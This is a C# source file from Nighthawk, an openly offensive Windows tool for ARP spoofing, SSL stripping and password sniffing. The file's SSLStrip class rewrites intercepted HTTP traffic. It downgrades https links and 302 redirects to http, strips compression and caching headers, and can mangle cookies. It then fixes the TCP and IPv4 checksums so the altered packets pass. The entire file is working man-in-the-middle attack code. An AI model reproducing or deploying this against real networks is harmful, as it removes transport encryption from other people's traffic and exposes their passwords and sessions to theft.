using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using PacketDotNet;

/**
Nighthawk - ARP/ND spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2011, 2012  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    public class SSLStrip
    {
        public bool Started;

        private bool stripCookies;

        private Regex regexEncoding = new Regex(@"Accept-Encoding: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexType = new Regex(@"(GET|POST) (.*?) HTTP\/1\.(0|1)", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexCType = new Regex(@"Content-Type: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
        private Regex regexModified = new Regex(@"If-Modified-Since: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);

        private static UTF8Encoding encodingUtf8 = new UTF8Encoding();

        // HTTP 302's to strip
        private List<string> stripRedirects = new List<string>();

        // events
        public event SSLStripHandler SSLStripped;

        private void Stripped(string sourceIP, string destIP, List<string> changed)
        {
            if (SSLStripped != null) SSLStripped(sourceIP, destIP, changed);
        }

        // start SSL stripping (strip cookies from HTTP requests)
        public void Start(bool cookies)
        {
            Started = true;
            stripCookies = cookies;

            stripRedirects = new List<string>();

            // check for file "strip-302.txt" and fill our list
            if (File.Exists("strip-302.txt"))
            {
                foreach (var line in File.ReadLines("strip-302.txt"))
                {
                    if(line != string.Empty) stripRedirects.Add(line);
                }

                Stripped(string.Empty, string.Empty, new List<string>() { "Loaded " + stripRedirects.Count + " URL(s) for HTTP 302 stripping!" });
            }
        }

        // stop SSL stripping
        public void Stop()
        {
            Started = false;
        }

        // process packet
        public bool ProcessPacket(Packet rawPacket, TcpPacket packet)
        {
            if (packet.ParentPacket == null) return true;
            if (packet.PayloadData == null) return true;

            var sourceIP = ((IpPacket) packet.ParentPacket).SourceAddress.ToString();
            var destIP = ((IpPacket) packet.ParentPacket).DestinationAddress.ToString();

            var payload = packet.PayloadData;

            var data = encodingUtf8.GetString(payload);
            
            if (data != string.Empty)
            {
                var changed = new List<string>();
                var matches = SimpleRegex.GetMatches(regexType, data);

                // HTTP request
                if (matches.Count > 2)
                {
                    // check for images - stop further processing
                    if (matches[2].Contains(".png") || matches[2].Contains(".jpg") || matches[2].Contains(".gif")) return true;

                    // check for Accept-Encoding and replace it to prevent unreadable data
                    if (data.Contains("Accept-Encoding:"))
                    {
                        var diff = data.Length - regexEncoding.Replace(data, "Accept-Encoding: \r\n").Length;

                        var extra = string.Empty;

                        for (int i = 0; i < diff; i++)
                        {
                            extra += " ";
                        }

                        data = regexEncoding.Replace(data, "Accept-Encoding: "+ extra +"\r\n");

                        changed.Add("Accept-Encoding");
                    }

                    // check for If-Modified-Since and replace it to prevent caching
                    if (data.Contains("If-Modified-Since:"))
                    {
                        var time = new DateTime(2000, 1, 1);
                        
                        data = regexModified.Replace(data, "If-Modified-Since: "+ time.ToString("R") +"\r\n");
                        changed.Add("If-Modified-Since");
                    }

                    // check for cookies and strip them if necessary
                    if (stripCookies && data.Contains("Cookie:"))
                    {
                        data = data.Replace("Cookie:", "C00kie:");

                        changed.Add("Cookies");
                    }
                }
                // HTTP response
                else
                {                    
                    // check for html tags - stop further processing
                    if (!(data.Contains("<form") || data.Contains("<input") || data.Contains("<a ") || data.Contains("</a>") || data.Contains("</div>") || data.Contains("<meta") || data.Contains("javascript"))) return true;

                    var cmatches = SimpleRegex.GetMatches(regexCType, data);

                    // check for images - stop further processing
                    if (cmatches.Count > 1 && cmatches[1].Contains("image")) return true;

                    // HTTP 302 redirect stripping
                    foreach (var item in stripRedirects)
                    {
                        if (data.Contains("Location: " + item))
                        {
                            data = data.Replace("Location: https://", "Location:  http://");

                            changed.Add("HTTPS (302 redirect)");
                        }
                    }

                    // other links, actions...
                    if (data.Contains("\"https://") || data.Contains("'https://"))
                    {
                        data = data.Replace("\"https://", "\" http://");
                        data = data.Replace("'https://", "' http://");

                        changed.Add("HTTPS");
                    }
                }
               
                if (changed.Count > 0)
                {
                    // change packet data to stripped one
                    var bytes = encodingUtf8.GetBytes(data);
                    var diff = packet.PayloadData.Length - bytes.Length;

                    packet.PayloadData = bytes;
                    packet.UpdateTCPChecksum();

                    // checksum fixes for IPv4 packets (IPv6 packet doesn't have a checksum)
                    if (packet.ParentPacket is IPv4Packet)
                    {
                        var ip = (IPv4Packet)packet.ParentPacket;
                        ip.TotalLength = ip.HeaderLength + packet.Bytes.Length;
                        ip.PayloadLength = (ushort)packet.Bytes.Length;
                        ip.Checksum = (ushort)(ip.Checksum + diff);
                    }
                    
                    Stripped(sourceIP, destIP, changed);
                }
            }

            return true;
        }
    }

    public class StrippedCookiesURL
    {
        public string SourceIP;
        public string URL;
    }

    public delegate void SSLStripHandler(string sourceIP, string destIP, List<string> changed);
}
